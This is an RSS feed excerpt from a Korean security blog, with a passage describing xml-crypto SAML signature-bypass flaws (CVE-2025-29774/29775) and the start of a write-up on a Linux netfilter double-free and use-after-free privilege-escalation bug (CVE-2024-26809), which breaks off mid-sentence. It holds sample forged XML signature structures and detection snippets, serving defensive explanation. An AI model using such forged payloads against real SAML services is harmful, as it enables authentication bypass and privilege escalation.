&#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; DigestValue&#xC5D0; HTML &#xC8FC;&#xC11D; (<code>&lt;!-- --&gt;</code>)&#xC744; &#xC0BD;&#xC785;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xC815;&#xC0C1;&#xC801;&#xC778; DigestValue&#xB294; Base64&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xC21C;&#xC218; &#xB370;&#xC774;&#xD130;&#xC5EC;&#xC57C; &#xD558;&#xC9C0;&#xB9CC;, xml-crypto&#xC758; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC740; &#xC774; &#xAC12;&#xC744; &#xB178;&#xB4DC; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xD30C;&#xC2F1;&#xD558;&#xC9C0; &#xC54A;&#xACE0;, &#xBB38;&#xC790;&#xC5F4; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xD574;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC8FC;&#xC11D;&#xACFC; &#xC704;&#xC870;&#xB41C; &#xAC12;&#xC744; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">DigestValue</span>&gt;</span>    <span class="hljs-comment">&lt;!--TBlYWE0ZWM4ODI1NjliYzE3NmViN2E1OTlkOGDhhNmI=--&gt;</span>    c7RuVDYo83z2su5uk0Nla8DXcXvKYKgf7tZklJxL/LZ=<span class="hljs-tag">&lt;/<span class="hljs-name">DigestValue</span>&gt;</span></code></pre><p>&#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC740; &#xC8FC;&#xC11D;&#xC744; &#xBB34;&#xC2DC;&#xD558;&#xACE0; &#xC2E4;&#xC81C; DigestValue&#xB9CC;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC11C;&#xBA85;&#xC774; &#xC720;&#xD6A8;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xB418;&#xC9C0;&#xB9CC;, &#xD574;&#xC11D;&#xD558;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xC8FC;&#xC11D;&#xACFC; &#xAC12;&#xC744; &#xACB0;&#xD569;&#xD574; &#xC798;&#xBABB;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB85C; &#xCC98;&#xB9AC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C;&#xC368; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2E0;&#xC6D0; &#xC815;&#xBCF4;&#xB098; &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xAD50;&#xBB18;&#xD788; &#xBCC0;&#xACBD;&#xD558;&#xBA74;&#xC11C;&#xB3C4; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC778;&#xC99D; &#xC6B0;&#xD68C; &#xBC0F; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; <code>xml-crypto</code>&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; SAML SSO&#xB97C; &#xAD6C;&#xD604;&#xD55C; &#xBAA8;&#xB4E0; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xAD11;&#xBC94;&#xC704;&#xD55C; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xBA70;, &#xD2B9;&#xD788; &#xC911;&#xC694;&#xD55C; &#xC2E0;&#xC6D0; &#xC815;&#xBCF4;&#xB098; &#xAD8C;&#xD55C; &#xC815;&#xBCF4;&#xAC00; &#xB2F4;&#xAE34; XML &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC870;&#xC791;&#xD574;&#xB3C4; &#xC5EC;&#xC804;&#xD788; &#xC11C;&#xBA85; &#xAC80;&#xC99D;&#xC744; &#xD1B5;&#xACFC;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>xml-crypto</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; 6.0.1 &#xBC84;&#xC804;&#xC5D0;&#xC11C; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB4E0; 6.0.0 &#xC774;&#xD558; &#xBC84;&#xC804;&#xC740; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><strong>SignedInfo &#xB178;&#xB4DC; &#xC911;&#xBCF5; &#xC5EC;&#xBD80; (CVE-2025-29774 &#xD0D0;&#xC9C0;&#xBC95;)</strong></p><p>SAML &#xC751;&#xB2F5;&#xC774;&#xB098; XML &#xBB38;&#xC11C; &#xB0B4;&#xC5D0;&#xC11C; <code>&lt;Signature&gt;</code> &#xC548;&#xC5D0; <code>&lt;SignedInfo&gt;</code> &#xB178;&#xB4DC;&#xAC00; &#xB450; &#xAC1C; &#xC774;&#xC0C1; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC815;&#xC0C1; &#xBB38;&#xC11C;&#xB294; &#xBC18;&#xB4DC;&#xC2DC; &#xD558;&#xB098;&#xB9CC; &#xC788;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Signature</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">SomeNode</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">SignedInfo</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span> <span class="hljs-attr">URI</span>=<span class="hljs-string">&quot;somefakereference&quot;</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">DigestValue</span>&gt;</span>forgeddigestvalue<span class="hljs-tag">&lt;/<span class="hljs-name">DigestValue</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">SignedInfo</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">SomeNode</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">SignedInfo</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">Reference</span> <span class="hljs-attr">URI</span>=<span class="hljs-string">&quot;realsignedreference&quot;</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">DigestValue</span>&gt;</span>realdigestvalue<span class="hljs-tag">&lt;/<span class="hljs-name">DigestValue</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">Reference</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">SignedInfo</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Signature</span>&gt;</span></code></pre><p>&#xD0D0;&#xC9C0;&#xC6A9; JavaScript &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs jsx"><span class="hljs-keyword">const</span> signedInfoNodes = xpath.select(<span class="hljs-string">&quot;.//*[local-name(.)=&apos;SignedInfo&apos;]&quot;</span>, signatureNode);<span class="hljs-keyword">if</span> (signedInfoNodes.length &gt; <span class="hljs-number">1</span>) {  <span class="hljs-comment">// Compromise detected</span>}</code></pre></li><li><p><strong>DigestValue &#xB0B4; &#xC8FC;&#xC11D; &#xC874;&#xC7AC; &#xC5EC;&#xBD80; (CVE-2025-29775 &#xD0D0;&#xC9C0;&#xBC95;)</strong></p><p><code>&lt;DigestValue&gt;</code> &#xBE14;&#xB85D; &#xC548;&#xC5D0; <code>&lt;!-- --&gt;</code> &#xD615;&#xD0DC;&#xC758; &#xC8FC;&#xC11D;&#xC774; &#xC0BD;&#xC785;&#xB41C; &#xACBD;&#xC6B0;&#xB294; &#xC815;&#xC0C1;&#xC801;&#xC778; XML &#xC11C;&#xBA85;&#xC5D0;&#xC11C;&#xB294; &#xC808;&#xB300; &#xC788;&#xC5B4;&#xC120; &#xC548; &#xB429;&#xB2C8;&#xB2E4;. &#xBC1C;&#xACAC; &#xC2DC; &#xC870;&#xC791;&#xB41C; &#xBA54;&#xC2DC;&#xC9C0;&#xB85C; &#xAC04;&#xC8FC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p> <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">DigestValue</span>&gt;</span>    <span class="hljs-comment">&lt;!-- malicious comment --&gt;</span>    validDigestValue==<span class="hljs-tag">&lt;/<span class="hljs-name">DigestValue</span>&gt;</span></code></pre><p>&#xD0D0;&#xC9C0;&#xC6A9; JavaScript &#xCF54;&#xB4DC;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;:</p> <pre><code class="hljs jsx"><span class="hljs-keyword">const</span> digestValues = xpath.select(<span class="hljs-string">&quot;//*[local-name()=&apos;DigestValue&apos;][count(node()) &gt; 1]&quot;</span>, decryptedDocument);<span class="hljs-keyword">if</span> (digestValues.length &gt; <span class="hljs-number">0</span>) {  <span class="hljs-comment">// Compromise detected</span>}</code></pre></li></ol><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-x3m8-899r-f7c3</a></p><p><a href="https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g">https://github.com/node-saml/xml-crypto/security/advisories/GHSA-9p8x-f768-wp2g</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/romi0x/">romi0x</category>
      
      <category domain="https://hackyboiz.github.io/tags/WorkOS/">WorkOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/xml-crypto/">xml-crypto</category>
      
      <category domain="https://hackyboiz.github.io/tags/XML-Signature-Wrapping/">XML Signature Wrapping</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/07/romi0x/1day1line0507/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-26809 : Linux Kernel Netfilter의 Use-After-Free로 인한 LPE 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/03/j0ker/2025-05-03/</link>
      <guid>https://hackyboiz.github.io/2025/05/03/j0ker/2025-05-03/</guid>
      <pubDate>Sat, 03 May 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://osec.io/blog/2024-11-25-netfilter-universal</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://osec.io/blog/2024-11-25-netfilter-universal-root-1-day#vulnerability-details">OtterRoot: Netfilter Universal Root 1-day</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 6.8 &#xC774;&#xC0C1; ~ 6.8.2 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 6.7 &#xC774;&#xC0C1; ~ 6.7.11 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 6.2 &#xC774;&#xC0C1; ~ 6.6.23 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 5.18.11 &#xC774;&#xC0C1; ~ 6.1.83 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 5.15.54 &#xC774;&#xC0C1; ~ 5.15.153 &#xBBF8;&#xB9CC;</li><li>&#xCEE4;&#xB110; &#xBC84;&#xC804; 5.10.130 &#xC774;&#xC0C1; ~ 5.10.214 &#xBBF8;&#xB9CC;</li></ul><h2 id="&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;"><a href="#&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;" class="headerlink" title="&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;"></a>&#xBC30;&#xACBD;&#xC9C0;&#xC2DD;</h2><p>CVE-2024-26809 &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xD574;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xB9AC;&#xB205;&#xC2A4; &#xCEE4;&#xB110;&#xC758; Netfilter &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC640; nftables &#xC11C;&#xBE0C;&#xC2DC;&#xC2A4;&#xD15C;, &#xADF8;&#xB9AC;&#xACE0; <code>nft_set_pipapo</code> &#xC9D1;&#xD569; &#xC720;&#xD615;&#xC5D0; &#xB300;&#xD55C; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC774;&#xD574;&#xAC00; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Netfilter &#xBC0F; nftables:</strong> Netfilter&#xB294; &#xB9AC;&#xB205;&#xC2A4; &#xCEE4;&#xB110; &#xB0B4;&#xC5D0;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD328;&#xD0B7;&#xC744; &#xAC00;&#xB85C;&#xCC44;&#xACE0; &#xC870;&#xC791;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xD575;&#xC2EC; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;. &#xBC29;&#xD654;&#xBCBD; &#xAD6C;&#xCD95;, NAT(Network Address Translation), &#xD328;&#xD0B7; &#xB85C;&#xAE45; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xB124;&#xD2B8;&#xC6CC;&#xD0B9; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;. nftables&#xB294; &#xAE30;&#xC874;&#xC758; <code>iptables</code>, <code>ip6tables</code>, <code>arptables</code>, <code>ebtables</code>&#xB97C; &#xB300;&#xCCB4;&#xD558;&#xAE30; &#xC704;&#xD574; &#xAC1C;&#xBC1C;&#xB41C; &#xCC28;&#xC138;&#xB300; &#xD328;&#xD0B7; &#xBD84;&#xB958; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB85C;, &#xB354;&#xC6B1; &#xC720;&#xC5F0;&#xD558;&#xACE0; &#xD6A8;&#xC728;&#xC801;&#xC778; &#xADDC;&#xCE59; &#xAD00;&#xB9AC;&#xB97C; &#xBAA9;&#xD45C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;. nftables&#xB294; &#xD14C;&#xC774;&#xBE14;(tables), &#xCCB4;&#xC778;(chains), &#xADDC;&#xCE59;(rules), &#xC9D1;&#xD569;(sets), &#xAC1D;&#xCCB4;(objects) &#xB4F1;&#xC758; &#xCD94;&#xC0C1;&#xD654;&#xB41C; &#xAC1C;&#xB150;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBCF5;&#xC7A1;&#xD55C; &#xD328;&#xD0B7; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>nft_set_pipapo:</strong> nftables&#xC758; &#xC9D1;&#xD569;(set)&#xC740; &#xD2B9;&#xC815; &#xB370;&#xC774;&#xD130; &#xC694;&#xC18C;&#xB4E4;&#xC758; &#xCEEC;&#xB809;&#xC158;&#xC744; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xBE60;&#xB974;&#xAC8C; &#xC870;&#xD68C;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. <code>nft_set_pipapo</code>&#xB294; &#x2018;Possible Intersection of Prefix Aggregation Prefix Overlap&#x2019;&#xC758; &#xC57D;&#xC790;&#xB85C;, &#xD2B9;&#xD788; IP &#xC8FC;&#xC18C; &#xBC94;&#xC704;&#xB098; &#xD3EC;&#xD2B8; &#xBC88;&#xD638; &#xBC94;&#xC704;&#xC640; &#xAC19;&#xC740; &#xAC04;&#xACA9;(interval) &#xAE30;&#xBC18;&#xC758; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD6A8;&#xC728;&#xC801;&#xC73C;&#xB85C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC9D1;&#xD569; &#xC720;&#xD615; &#xC911; &#xD558;&#xB098;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC9D1;&#xD569; &#xC720;&#xD615;&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xC7A1;&#xD55C; &#xC790;&#xB8CC;&#xAD6C;&#xC870;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC694;&#xC18C;&#xC758; &#xC0BD;&#xC785;, &#xC0AD;&#xC81C;, &#xAC80;&#xC0C9; &#xC5F0;&#xC0B0;&#xC744; &#xCD5C;&#xC801;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. <code>nft_set_pipapo.c</code> &#xD30C;&#xC77C; &#xB0B4;&#xC758; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xC774; PIPAPO &#xC9D1;&#xD569;&#xC758; &#xC0DD;&#xC131;, &#xC218;&#xC815;, &#xC0AD;&#xC81C;, &#xC694;&#xC18C; &#xAD00;&#xB9AC; &#xB4F1;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xB85C;&#xC9C1;&#xC744; &#xAD6C;&#xD604;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xBC0F; &#xD074;&#xB860;:</strong> nftables&#xC758; &#xC124;&#xC815; &#xBCC0;&#xACBD;&#xC740; &#xC6D0;&#xC790;&#xC131;(atomicity)&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xADDC;&#xCE59; &#xCD94;&#xAC00;, &#xC9D1;&#xD569; &#xC694;&#xC18C; &#xBCC0;&#xACBD; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC774; &#xD558;&#xB098;&#xC758; &#xBC30;&#xCE58;(batch)&#xB85C; &#xBB36;&#xC5EC; &#xCC98;&#xB9AC;&#xB418;&#xBA70;, &#xBAA8;&#xB4E0; &#xC791;&#xC5C5;&#xC774; &#xC131;&#xACF5;&#xD558;&#xBA74; &#xCEE4;&#xBC0B;(commit)&#xB418;&#xACE0; &#xD558;&#xB098;&#xB77C;&#xB3C4; &#xC2E4;&#xD328;&#xD558;&#xBA74; &#xC804;&#xCCB4; &#xC791;&#xC5C5;&#xC774; &#xC911;&#xB2E8;(abort)&#xB418;&#xC5B4; &#xB864;&#xBC31;&#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC77C;&#xAD00;&#xC131;&#xC744; &#xC720;&#xC9C0;&#xD558;&#xACE0; &#xB3D9;&#xC2DC;&#xC131; &#xBB38;&#xC81C;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574;, &#xBCC0;&#xACBD; &#xB300;&#xC0C1;&#xC774; &#xB418;&#xB294; &#xC9D1;&#xD569;&#xACFC; &#xAC19;&#xC740; &#xAC1D;&#xCCB4;&#xB294; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xBCF5;&#xC81C;&#xBCF8;, &#xC989; &#xD074;&#xB860;(clone)&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC5EC; &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD074;&#xB860;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD2B9;&#xC815; &#xC2DC;&#xC810;&#xC758; &#xC0C1;&#xD0DC;&#xB97C; &#xBC18;&#xC601;&#xD558;&#xB294; &#xC77D;&#xAE30; &#xC804;&#xC6A9; &#xBDF0;&#xB85C; &#xC0AC;&#xC6A9;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><h2 id="&#xCDE8;&#xC57D;&#xC810;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;-&#xC0C1;&#xC138;-&#xC124;&#xBA85;"><a href="#&#xCDE8;&#xC57D;&#xC810;-&#xBA54;&#xCEE4;&#xB2C8;&#xC998;-&#xC0C1;&#xC138;-&#xC124;&#xBA85;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xC0C1;&#xC138; &#xC124;&#xBA85;"></a>&#xCDE8;&#xC57D;&#xC810; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xC0C1;&#xC138; &#xC124;&#xBA85;</h2><p>CVE-2024-26809 &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>nft_set_pipapo</code> &#xC9D1;&#xD569;&#xC758; &#xD074;&#xB860; &#xCC98;&#xB9AC; &#xB85C;&#xC9C1;&#xACFC; &#xD2B8;&#xB79C;&#xC7AD;&#xC158; &#xAD00;&#xB9AC; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xC0AC;&#xC774;&#xC758; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xAD00;&#xB9AC; &#xC624;&#xB958;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD575;&#xC2EC; &#xBB38;&#xC81C;&#xB294; <strong>&#xD074;&#xB860;&#xB41C; &#xC9D1;&#xD569;&#xC758; &#xC694;&#xC18C;&#xB97C; &#xD574;&#xC81C;&#xD558;&#xB294; &#xBC29;&#xC2DD;</strong>&#xC5D0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xD55C; &#xBC84;&#xC804;&#xC758; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xD2B9;&#xC815; &#xC870;&#xAC74;, &#xD2B9;&#xD788; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC774; &#xC911;&#xB2E8;(abort)&#xB418;&#xAC70;&#xB098; &#xC9D1;&#xD569;&#xC774; &#xC0AD;&#xC81C;(destroy)&#xB418;&#xB294; &#xACBD;&#xC6B0;, &#xD074;&#xB860;&#xB41C; &#xC9D1;&#xD569;&#xC5D0; &#xC18D;&#xD55C; &#xC694;&#xC18C;&#xB4E4;&#xC744; &#xD574;&#xC81C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xAC1D;&#xCCB4; &#xD30C;&#xAD34; &#xACBD;&#xB85C;(destroy path)&#xB97C; &#xB530;&#xB974;&#xC9C0; &#xC54A;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xB85C;&#xC9C1;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB137;&#xD544;&#xD130; &#xCEE4;&#xBC0B; &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC758; &#xC124;&#xACC4; &#xC6D0;&#xCE59;&#xC0C1;, &#xD074;&#xB860;&#xC740; &#xD56D;&#xC0C1; &#xC870;&#xD68C; &#xD14C;&#xC774;&#xBE14;&#xC758; &#x2018;&#xD604;&#xC7AC; &#xBDF0;(current view)&#x2019;&#xB97C; &#xC81C;&#xACF5;&#xD574;&#xC57C; &#xD558;&#xBA70;, &#xAC1D;&#xCCB4;&#xC758; &#xC2E4;&#xC81C; &#xD30C;&#xAD34;&#xB294; &#xC77C;&#xAD00;&#xB41C; &#xD30C;&#xAD34; &#xACBD;&#xB85C;&#xB97C; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC838;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xC6D0;&#xCE59;&#xC744; &#xC704;&#xBC18;&#xD558;&#xC5EC;, &#xC5B4;&#xBCF4;&#xD2B8; &#xACBD;&#xB85C; &#xB4F1;&#xC5D0;&#xC11C; &#xD074;&#xB860;&#xC758; &#xBDF0;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC694;&#xC18C;&#xB97C; &#xC9C1;&#xC811; &#xD574;&#xC81C;&#xD558;&#xB824; &#xC2DC;&#xB3C4;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;:</p><ol><li><strong>Double-Free:</strong> &#xD2B9;&#xC815; &#xC870;&#xAC74;(&#xC544;&#xB798; &#xADFC;&#xBCF8; &#xC6D0;&#xC778; &#xBD84;&#xC11D; &#xCC38;&#xC870;) &#xD558;&#xC5D0;&#xC11C; <code>nft_pipapo_destroy</code> &#xD568;&#xC218; &#xB0B4;&#xC5D0;&#xC11C; <code>nft_set_pipapo_match_destroy</code> &#xD568;&#xC218;&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD55C; &#xBC88;&#xC740; &#xC6D0;&#xBCF8; <code>priv-&gt;match</code> &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD574;, &#xB2E4;&#xB978; &#xD55C; &#xBC88;&#xC740; &#xD074;&#xB860; <code>priv-&gt;clone</code> &#xAC1D;&#xCCB4;&#xC5D0; &#xB300;&#xD574; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xCEE4;&#xBC0B;&#xB41C; &#xC694;&#xC18C;&#xB4E4;&#xC740; &#xB450; &#xAC1D;&#xCCB4; &#xBAA8;&#xB450;&#xC5D0; &#xBDF0;(view)&#xB97C; &#xAC00;&#xC9C0;&#xBBC0;&#xB85C;, &#xC774; &#xC694;&#xC18C;&#xB4E4;&#xC5D0; &#xB300;&#xD574; <code>nf_tables_set_elem_destroy</code> &#xD568;&#xC218;&#xAC00; &#xB450; &#xBC88; &#xD638;&#xCD9C;&#xB418;&#xC5B4; &#xB3D9;&#xC77C;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;(<code>elem_priv</code>)&#xB97C; &#xB450; &#xBC88; &#xD574;&#xC81C;(kfree)&#xD558;&#xB294; Double-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>Use-After-Free (UAF):</strong> Double-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xBA74;, &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;(<code>elem_priv</code>)&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;(&#xB315;&#xAE00;&#xB9C1; &#xD3EC;&#xC778;&#xD130;)&#xAC00; &#xCEE4;&#xB110; &#xB0B4; &#xB2E4;&#xB978; &#xACF3;(&#xC608;: &#xB2E4;&#xB978; &#xB137;&#xD544;&#xD130; &#xAD6C;&#xC870;&#xCCB4;, &#xC9C4;&#xD589; &#xC911;&#xC778; 